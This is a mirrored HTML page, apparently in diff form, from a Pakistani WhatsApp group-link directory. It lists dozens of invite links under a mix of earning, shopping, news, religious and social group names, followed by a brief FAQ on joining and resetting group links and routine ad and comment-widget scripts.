+                       window.open('../../external.html?link=https://chat.whatsapp.com/DxcmGD2zz5HHHlY5AGfJpd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>YOUTUBE HELP</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EkwLrgZhAjHGWoh54plcxX'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>❤️øⁿ̃ˡᵉʏ ˢᵗᵃᵗᵘˢ 𝕠𝕗𝕗𝕚𝕔𝕚𝕒𝕝❤️💪</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Im8pAv2HY5YHWc3Od2cB2u'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>WEE Group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/F8DLjx34SDjJeLLvTznhtR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Give away only Pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KEGNO7u04FRD2eLDDv4Rmu'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Poetry world🔥</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HvZCCSwTPspBvGAj979Jvn'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Malik Production</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/G8vkqEBNqe8GPD5ePRTTiG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Make money online</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EsAAybFpZlHK9HIwKtZHqi'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Lahore Bottem</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Gngo5jJQfR9HPcCLNXMDXW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Easyload sell & buy </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D87dl9kpVEu9TVthJ1WO59'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Purchase of jewelry</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L0ZDkh8yMI44jWNJlIacVb'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Jobs in pakistan 2</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LCHb881y3BpIZolU7efe6C'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Jobs in Pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Jry8lMFs37mGfmBUasXC3A'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Entertainment</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FzQSAqrzgUdB2G2jcQAanE'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Everything for you</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CkajnG2UwxgJ4izLvq7rfV'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg account market</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Cxp0UuAykQHAr7Da0z8PTB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ladies Cosmetics Dress </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DaKNNwu94pnA7a0ZAKunOZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>love me thoda</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JmexsixbBmoDwpQUeziSOK'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Without investment sites </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LKIbUWCvaoH1SH7zqd2jHr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Payeer and Pm buy Sell low reta </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GLbLWPuvT9jJDuYCGxwF80'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Geo Jamali</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GL3xqi5SrUL4mbf0ux6DWF'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>BBC NEWS PAKISTAN</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FHraYYa97618TY0SjK47rr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mathematics class 9</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DluUEQ6JqYP3sMls9sJqnt'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Bet online </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EGYdTRmAPLP8Vjv3KtB0pd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Memes of pakistann</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Cv5Ps3s9pmk4ZhBtgoWiZb'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Quran female </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GC1dcEK0IfrDzbPtWgtaPb'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>القرآن آنلائن اکیڈمی 03081074148</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CyN11dfz3UZ0vMfr48YBEx'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Gold state digital earn</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DrbSqTYCs50DCjPYug2ihJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ONLY Big invester </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CbcIVKQFfOsGTIJuypk1Ve'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ladies Suits </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DaKNNwu94pnA7a0ZAKunOZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>تحریر </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IsWKdntvz8kKN32Snjw0cc'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sameer</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EK6nn33978G07Cb0k3nZXn'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>(اصلاحِ معاشرہ)</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FYdek2R8nhqFNhwq9eUldt'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tik tok</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CqvchoCJORP2cdlMMp0ngp'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>EARN MONEY IN USD DOLLARS</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CKRYJf91d9xBadRXByKlc7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>FREE INTERNET 2020</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ei2S7dbgSCv4vohitSaopw'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Distributor Karachi</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open(' ../../external.html?link=https://chat.whatsapp.com/DSNRcZNIdUkFhdyK3z6eYl'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>NBox 24 Newz</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JpLwV2sI6gEDo5EkUM9sko'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Titok helper</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DWpSTViKkPsCG0H8LgLsvI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Shopper buddy</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IfRmFErfTCR0a7rhKoisQC'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>یاراں نال بہاراں</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EFkO9K5qv1t87h9b4UJ9OK'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Graceful collection </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JHvdAAKecyE1aB2uUH6Rai'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn money online free</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LGoIbHgZDlSGqRL9C8DVej'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg account selling point</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D3Qw6QBalW43QGy6m39SCs'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Dubai and hyip sites investment plan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IaredQ0y0GdIOcTRVKhGOW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Subscribe Youtube Channels And Earn Money</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KBuiCwQF3u8Js1SjTLydM7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>مردانہ کمزوری کا علاج</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GH4fEjQRgZsAiFmt18oMWB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Health And Beauty Product</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/I0ijLKzalNW4GY53yD27fL'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i> news and jobs group 2020</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Elu5GMD26q2KPVuI048Cmg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ONLY Big invester </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CbcIVKQFfOsGTIJuypk1Ve'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Gold state digital earn</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DrbSqTYCs50DCjPYug2ihJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tiktoke</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JLz3bVgmxB5GVRxHgqiLII'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Student earning </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CMqwcQfDXjk0OjIqPXvtA9'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>I am Alone</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EjoablHw1XN5865Pwt51Ol'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn money 100✓</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CMqwcQfDXjk0OjIqPXvtA9'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online earning granti k 7</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CBsLCkyegTqFBg2eRDSMYd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Real Earning & $Exchange </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/G9NjiuN1svzL53qSo56BKg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Stockmarket forex</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L0qLfJFAfnZ4Mwaa1U8SKr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Rabub Ul Chandio</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HsrQZdbn1w76aF5nnDREaU'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>New doubler sites</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HuPF3qxX39EIUoTwira9vZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>YouTube and instagramers</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/K6nLvw3G0SG6c3Lx9KEmR2'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Subscribe Youtube Channels And Earn Money</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KBuiCwQF3u8Js1SjTLydM7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Earn Money</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KxdMIFsaKGh45deW9TXQoc'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>PPSC Arifwala</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FYdek2R8nhqFNhwq9eUldt'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>PPSC Arifwala(اصلاحِ معاشرہ)</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FYdek2R8nhqFNhwq9eUldt'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Shopping</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IyVh1YsFb5N8bDgDNpHSCl'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn at home</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L0BBBRB9zc4JyYwBqhC1TJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ayyan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CTTUlI7LAiM29ZQcmtBYMS'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistani online bazaar</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ktbnsn0R1zE6BwD1rAA0Hc'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islamic group </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FBLKQjj7RokByzQVxve98Y'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>SiM DATABASE</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IPrrqZBEJKd6Rz2S7NIamY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online businesshere</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CV0HevFcob15yufiarVNyf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Lahore Shemele</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KyVc89lWcEkA4Rpo3X5mgY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>MAF Collection </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KJEaWrmHLveHfp7aEzAgys'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>OnlineEarningReal100%</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KZTqm6gD0c66TZQNIK9JOA'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Quran Hadees</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CUUGCzChKqBG6xCJt3UnUx'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Cloth, Fabric Wholesale</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CgwlKa7DomzISbeZD8UEKj'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>general knowledge 2</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IyzHcQtLWW18jqmf3q7F8u'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Photo Editing</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GcjMLthFFEG3Ki57isXIh7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 2️⃣ </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HlsOHwdfMAlEtQXGPAxKNg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Kamalia Khaddar House</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/J86YwUTGvxYBs8gC7NbVHG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>TLP update</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GXPYt3AhS8MBlIaOaGZuBy'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Hybrid war Pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CqD519xjTdJ8DROEVkExGz'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistani YouTuber Helps</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D1PYIYCcrRf8aqxNbOUU6M'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>L.E.D Bulb Hole Sale Pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D1hyPxu23WUABGRrhQOs44'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ladies Cosmetic & Dresses & Bags Online Shop</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FVGsdrgzg6qD4BYu1Rv5AP'); 
+                       ">Join</button></td>                    </tr>    
+                        </table>
+                    </article>
+        
+       
+        </div>
+
+<div class="row" style="margin-top:5px;">
+<!-- Display ad-->
+
+ <ins class="adsbygoogle"
+     style="display:inline-block;width:100%;height:250px"
+     data-ad-client="ca-pub-5934710178337836"
+     data-ad-slot="3028513746"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+        
+ <div class="row" style="width:98%;margin-left:1%;background:#ffffff;border-radius:6px;padding:20px;margin-top:10px;margin-bottom:10px;border:1px solid #d3d3d3;">
+            <center><h3 style="font-style: italic;">More Blogs</h3></center>
+    </div>
+<div class="row">
+        
+  <div class="col-lg-4 col-xs-6" id="filterable">
+          <div class="thumbnail">
+          <a href="make-money-online.html"><img class="img-thumbnail img-responsive" src="../../external.html?link=https://www.pak24tv.com/images/onlinemoneythumbnail.jpeg" alt="How to make money online" style="border:none;padding:0;width:100%;border-radius:0px;"></a>
+          <div class="caption">
+    <a href="make-money-online.html"><em style="overflow: hidden;
+    text-overflow: ellipsis;
+    display: -webkit-box;
+    line-height: 20px;    
+    height: 60px;     
+    -webkit-line-clamp:3;
+    -webkit-box-orient: vertical;
+    font-size:17px;">How to make money online?</em></a>
+         </div>
+         </div>
+      </div>    
+<div class="col-lg-4 col-xs-6" id="filterable">
+          <div class="thumbnail">
+          <a href="girls-whatsapp-group-link.html"><img class="img-thumbnail img-responsive" src="../images/girlswhatsappgroup.jpg" alt="Girls WhatsApp group links" style="border:none;padding:0;width:100%;border-radius:0px;"></a>
+          <div class="caption">
+    <a href="girls-whatsapp-group-link.html"><em style="overflow: hidden;
+    text-overflow: ellipsis;
+    display: -webkit-box;
+    line-height: 20px;    
+    height: 60px;     
+    -webkit-line-clamp:3;
+    -webkit-box-orient: vertical;
+    font-size:17px;">Girls WhatsApp group links</em></a>
+         </div>
+         </div>
+      </div>
+
+<div class="col-lg-4 col-xs-6" id="filterable">
+          <div class="thumbnail">
+          <a href="pakistani-whatsapp-groups.html"><img class="img-thumbnail img-responsive" src="../images/pakistaniwhatsapp.jpg" alt="Pakistani WhatsApp group links" style="border:none;padding:0;width:100%;border-radius:0px;"></a>
+          <div class="caption">
+    <a href="pakistani-whatsapp-groups.html"><em style="overflow: hidden;
+    text-overflow: ellipsis;
+    display: -webkit-box;
+    line-height: 20px;    
+    height: 60px;     
+    -webkit-line-clamp:3;
+    -webkit-box-orient: vertical;
+    font-size:17px;">Pakistani WhatsApp group links</em></a>
+         </div>
+         </div>
+      </div> 
+      
+<div id="graphcomment"></div>
+<script type="text/javascript">
+
+  /* - - - CONFIGURATION VARIABLES - - - */
+
+  // make sure the id is yours
+  window.gc_params = {
+    graphcomment_id: 'Pak24tv',
+
+    // if your website has a fixed header, indicate it's height in pixels
+    fixed_header_height: 0,
+  };
+
+  /* - - - DON'T EDIT BELOW THIS LINE - - - */
+
+  
+  (function() {
+    var gc = document.createElement('script'); gc.type = 'text/javascript'; gc.async = true;
+    gc.src = '../../graphcomment.com/js/integrationd41d.js' + Math.round(Math.random() * 1e8);
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(gc);
+  })();
+
+</script>     
+      
+</div>   
+
+
+</div>
+<div class="row" style="width:98%;margin-left:1%;border:1px solid #d3d3d3;margin-bottom:10px;margin-top:10px;border-radius:6px;padding:12px;">
+               <p style="font-size:17px;">If you want to join community in Pakistan then you opened the good website. You can join multiple WhatsApp group link on Pak24tv. You can join <b>Pakistani WhatsApp group link</b> easily. You can also submit Pakistani WhatsApp group links and increase you community.</b></p>
+                         <p style="font-size:17px;">If you have any issue to join Pakistani WhatsApp group link then you can report us that link. We will check report and take action against that report. If you want to make community to your group then you can share your group. We will check your group and will publish on the page.</p>
+               
+</div>
+<div class="row" style="width:98%;margin-left:1%;margin-top:15px;color:#000000;border:1px solid #d3d3d3;border-radius:6px;margin-bottom:6px;padding:20px;margin-bottom:10px;">
+            <h2><center>FAQ's and their answers</center></h2>
+</div>
+
+<div class="row" style="border:1px solid #d3d3d3;width:98%;margin-left:1%;padding:8px;">
+    <h4>Q 1:How to reset Pakistani WhatsApp group link?</h4>
+         <ol style="font-size:17px;">
+             <li>Go to WhatsApp group</li>
+             <li>Under group info setting you will find the option "Invite to Group via Link"</li>
+             <li>You will get the option of reset link</li>
+             <li>After clicking that you link will be reset and you will get the new link</li>
+         </ol>
+    <h4>Q 2:How to add new member in Pakistani WhatsApp group?</h4>
+       <ol style="font-size:17px;">
+           <li>First save the person number into phone those you want to add into WhatsApp group</li>
+           <li>Then open the group in which you want to add person</li>
+           <li>Then click on group name</li>
+           <li>you will find a plus (+) sign with Add Participants written</li>
+           <li>Click on that sign</li>
+           <li>After clicking on that sign person will be add in the group</li>
+       </ol>
+       <h4>Q 3: How to join Pakistani WhatsApp group links?</h4>
+       <ol style="font-size:17px;">
+       <li>Choose the group that you want to join.</li>
+       <li>Click the join button.</li>
+       <li>Then you will be enter in girls WhatsApp groups.</li>
+       </ol>
+</div><br/>
+
+<div class="row" style="border:1px solid #d3d3d3;margin-bottom:10px;margin-top:10px;border-radius:6px;width:98%;margin-left:1%;">
+           <center><h2>Tags</h2></center>
+           <div class="row" style="width:90%;margin-left:5%;border:1px solid #d3d3d3;margin-bottom:10px;margin-top:10px;padding:5px;border-radius:6px;">
+               
+               <ol style="font-size:17px;">
+          <li><b>Pakistani WhatsApp groups</b></li>
+          <li>WhatsApp group links</li>
+          <li><b>Pakistani girls WhatsApp group links</b></li>
+          <li><b>Pakistani girls WhatsApp group links</b></li>
+          <li><b>Pakistani WhatsApp group link</b></li>
+          <li><b>Pakistani WhatsApp group links</b></li>
+          <li>1000+ Active Pakistani WhatsApp group Links Join</li>
+          <li>Pakistani WhatsApp groups links</li>
+          <li>Pakistani WhatsApp groups link</li>
+          <li>Pakistani news WhatsApp group links</li>
+          <li>Pakistani entertainment WhatsApp group links</li>
+          <li>Pakistani shyeri WhatsApp group links</li>
+          <li>Pakistani girls WhatsApp group links</li>
+          <li>Pakistani girls WhatsApp group links join</li>
+               </ol>
+
+           </div>
+       </div>       
+       
+    
+      <div class="col-sm-2 sidenav" style="background:initial;">
+    
+        
+        </div>
+    
+    </div>
+    </div>
+    </div>
+                                          
+                                          
+      <style>
+         @media only screen and (min-width:600px) {
+        #list{
+            margin-top:30%;
+       }
+         }
+         #blogimg{
+    width:100%;
+    height:260px;
+}
+    @media screen and (min-device-width: 0px) and (max-device-width: 768px) {
+#blogimg{
+    width:100%;
+    height:150px;
+}
+}
+    </style>    
+       <footer style="min-height:60px;background-color:#000A08">
+        <center id="c" style="color:#ffffff;"><footer style="background-color:#000A08;color:#ffffff;">
+ <center>
+
+       <ul style="list-style:none;font-size:15px;">
+    <li><a href="../../external.html?link=https://www.pak24tv.com/About-us.php" style="color:#ffffff;">About us</a></li>
+                <li><a href="../../external.html?link=https://www.pak24tv.com/contact-us.php" style="color:#ffffff;">Contact us</a></li>
+                <li><a href="../../external.html?link=https://www.pak24tv.com/privacy-policy.php" style="color:#ffffff;">Privacy policy</a></li>
+                                <li><a href="../../external.html?link=https://www.pak24tv.com/disclaimer.php" style="color:#ffffff;">Disclaimer</a></li><br/>
+        <div class="sharethis-inline-follow-buttons"></div>
+  </ul>
+ </center>   
+</footer></center>
+    </footer>
+    
+</body>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'sg2plcpnl0183'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='../../img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script>
+<!-- Mirrored from www.pak24tv.com/blogs/pakistani-whatsapp-groups by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 03 Dec 2020 22:37:52 GMT -->
+</html>
